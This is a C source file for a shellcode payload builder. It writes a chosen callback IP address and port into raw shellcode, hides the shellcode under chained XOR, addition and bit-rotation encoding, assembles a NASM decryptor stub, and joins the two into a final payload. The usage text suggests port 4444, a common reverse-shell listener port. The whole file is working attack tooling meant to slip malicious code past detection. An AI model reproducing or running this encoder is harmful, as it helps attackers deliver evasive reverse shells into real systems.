#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

void xor_encrypt(uint8_t *data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void add_encrypt(uint8_t *data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] = (uint8_t)(data[i] + key);
    }
}

uint8_t rol_byte(uint8_t b, uint8_t bits) {
    return (b << bits) | (b >> (8 - bits));
}

void rol_encrypt(uint8_t *data, size_t len, uint8_t bits) {
    for (size_t i = 0; i < len; i++) {
        data[i] = rol_byte(data[i], bits);
    }
}

int patch_shellcode_ip_port(uint8_t *shellcode, size_t len, uint32_t ip, uint16_t port, size_t ip_offset, size_t port_offset) {
    if (ip_offset + 4 > len || port_offset + 2 > len) {
        fprintf(stderr, "IP or port offset out of range\n");
        return -1;
    }
    memcpy(shellcode + ip_offset, &ip, 4);
    memcpy(shellcode + port_offset, &port, 2);
    return 0;
}

int patch_decryptor_len(const char *src_path, const char *dst_path, size_t shellcode_len) {
    FILE *src = fopen(src_path, "r");
    if (!src) {
        perror("Failed to open decryptor source");
        return -1;
    }
    FILE *dst = fopen(dst_path, "w");
    if (!dst) {
        perror("Failed to open patched decryptor source");
        fclose(src);
        return -1;
    }

    char line[512];
    while (fgets(line, sizeof(line), src)) {
        if (strncmp(line, "shellcode_len equ", 17) == 0) {
            fprintf(dst, "shellcode_len equ %zu\n", shellcode_len);
        } else {
            fputs(line, dst);
        }
    }

    fclose(src);
    fclose(dst);
    return 0;
}

int assemble_decryptor(const char *src_path, const char *out_path) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "nasm -f bin \"%s\" -o \"%s\"", src_path, out_path);
    int ret = system(cmd);
    if (ret != 0) {
        fprintf(stderr, "NASM assembly failed with code %d\n", ret);
        return -1;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 9) {
        fprintf(stderr, "Usage: %s decryptor.asm shellcode.bin ip port ip_offset port_offset patched_decryptor.asm final_payload.bin\n", argv[0]);
        fprintf(stderr, "Example IP: 0x7F000001 (127.0.0.1), port: 0x5c11 (4444 network byte order)\n");
        return 1;
    }

    const char *decryptor_src = argv[1];
    const char *shellcode_file = argv[2];
    uint32_t ip = (uint32_t)strtoul(argv[3], NULL, 0);
    uint16_t port = (uint16_t)strtoul(argv[4], NULL, 0);
    size_t ip_offset = (size_t)strtoul(argv[5], NULL, 0);
    size_t port_offset = (size_t)strtoul(argv[6], NULL, 0);
    const char *patched_decryptor_src = argv[7];
    const char *final_payload_file = argv[8];

    // Read shellcode
    FILE *f_shell = fopen(shellcode_file, "rb");
    if (!f_shell) {
        perror("Failed to open shellcode file");
        return 1;
    }
    fseek(f_shell, 0, SEEK_END);
    size_t shell_len = ftell(f_shell);
    rewind(f_shell);

    uint8_t *shellcode = malloc(shell_len);
    if (!shellcode) {
        perror("Malloc failed");
        fclose(f_shell);
        return 1;
    }
    fread(shellcode, 1, shell_len, f_shell);
    fclose(f_shell);

    // Patch IP and port
    if (patch_shellcode_ip_port(shellcode, shell_len, ip, port, ip_offset, port_offset) != 0) {
        free(shellcode);
        return 1;
    }

    // Encrypt shellcode
    xor_encrypt(shellcode, shell_len, 0xAA);
    add_encrypt(shellcode, shell_len, 0x10);
    rol_encrypt(shellcode, shell_len, 3);

    // Patch decryptor source with shellcode length
    if (patch_decryptor_len(decryptor_src, patched_decryptor_src, shell_len) != 0) {
        free(shellcode);
        return 1;
    }

    // Assemble decryptor
    const char *decryptor_bin = "decryptor.bin";
    if (assemble_decryptor(patched_decryptor_src, decryptor_bin) != 0) {
        free(shellcode);
        return 1;
    }

    // Read decryptor binary
    FILE *f_decryptor = fopen(decryptor_bin, "rb");
    if (!f_decryptor) {
        perror("Failed to open decryptor binary");
        free(shellcode);
        return 1;
    }
    fseek(f_decryptor, 0, SEEK_END);
    size_t decryptor_len = ftell(f_decryptor);
    rewind(f_decryptor);

    uint8_t *decryptor = malloc(decryptor_len);
    if (!decryptor) {
        perror("Malloc failed");
        fclose(f_decryptor);
        free(shellcode);
        return 1;
    }
    fread(decryptor, 1, decryptor_len, f_decryptor);
    fclose(f_decryptor);

    // Write final payload
    FILE *f_out = fopen(final_payload_file, "wb");
    if (!f_out) {
        perror("Failed to open output file");
        free(shellcode);
        free(decryptor);
        return 1;
    }
    fwrite(decryptor, 1, decryptor_len, f_out);
    fwrite(shellcode, 1, shell_len, f_out);
    fclose(f_out);

    free(shellcode);
    free(decryptor);

    printf("Final payload written to %s\n", final_payload_file);
    return 0;
}
